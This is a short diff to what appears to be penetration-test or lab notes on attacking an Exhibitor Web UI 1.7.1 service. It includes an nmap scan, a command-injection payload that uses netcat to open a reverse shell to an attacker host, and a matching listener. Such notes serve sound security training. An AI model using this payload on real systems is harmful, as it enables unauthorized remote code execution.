@@ -56,7 +56,7 @@ sudo nmap -sC -sV -Pn -p- 192.168.180.98 -oN 180.98_allport
 
 # 8080 : Exhibitor Web UI 1.7.1 - Remote Code Execution
 # https://www.exploit-db.com/exploits/48654
-$(/bin/nc -e /bin/sh kali 8888 &)
+$(/bin/nc -e /bin/sh kali_ip 8888 &)
 
 # nc
 nc -nvlp 8888
